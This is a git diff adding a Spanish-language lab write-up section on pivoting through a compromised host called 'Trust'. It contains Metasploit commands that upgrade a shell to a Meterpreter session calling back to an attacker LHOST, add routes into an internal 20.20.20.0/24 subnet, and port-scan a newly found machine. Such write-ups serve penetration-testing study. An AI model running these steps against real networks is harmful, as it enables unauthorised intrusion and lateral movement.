@@ -494,3 +494,71 @@ Nos conectamos a la sesión (ya tendríamos acceso a la primera máquina) y vamo
 sessions -i 1
 ```
 
+### Trust
+
+Aquí estamos accediendo a una sesión shell normal, no a una Meterpreter. Por tanto usaremos un módulo que nos cambie de shell de a meterpreter:
+```bash
+use multi/manage/shell_to_meterpreter
+options
+set LHOST 10.10.10.1
+set SESSION 1
+run
+
+# Cuando funciona
+sessions -i 2
+```
+
+Ya tenemos una sesión meterpreter. Desde aquí ahora iniciaremos el pivoting. 
+
+```bash
+# En Meterpreter
+ipconfig     # vemos una nueva interfaz de red 20.20.20.2
+```
+
+Por tanto desde Trust podemos alcanzar Inclusion. 
+
+Ahora ejecutaremos lo siguiente (hay dos comandos, elegir uno)
+```bash
+# Elegir un comando
+run autoroute -s 20.20.20.0/24
+
+route add 20.20.20.0 255.255.255.0 2
+```
+
+autoroute: script de metasploit para gestionar rutas
+
+-s: indica la subred que queremos añadir
+
+20.20.20.0/24: red interna que queremos alcanzar (equivalente en el route add a 20.20.20.0 255.255.255.0 (esto es /24))
+
+El autoroute de todas formas está un poco deprecado. Funciona, pero Metasploit recomienda usar el módulo: `post/multi/manage/autoroute`
+
+Ahora salimos de la sesión (Ctrl+Z) y podemos ver las rutas con `route`.
+
+Ahora Metasploit sabe que para llegar a cualquier IP 20.20.20.X debe utilizar la sesión Meterpreter 2.
+
+Vamos a usar un módulo para escanear máquinas en la red nueva que acabamos de añadir a Metasploit:
+```bash
+use auxiliary/scanner/portscan/tcp
+options
+set RHOSTS 20.20.20.0/24
+set PORTS 80
+set THREADS 20
+set CONCURRENCY 10
+set TIMEOUT 500
+run
+```
+
+Encontramos una máquina nueva en la nueva red: 20.20.20.3
+
+<img width="589" height="326" alt="imagen" src="https://github.com/user-attachments/assets/01a80a15-6e1d-4b38-8133-3cf918c3f340" />
+
+Vamos a escanear esta máquina solo ahora:
+```bash
+set RHOSTS 20.20.20.3
+set PORTS 1-65535
+run
+```
+
+Ahora en esta máquina nos encuentra abiertos el puerto 22 y el puerto 80.
+
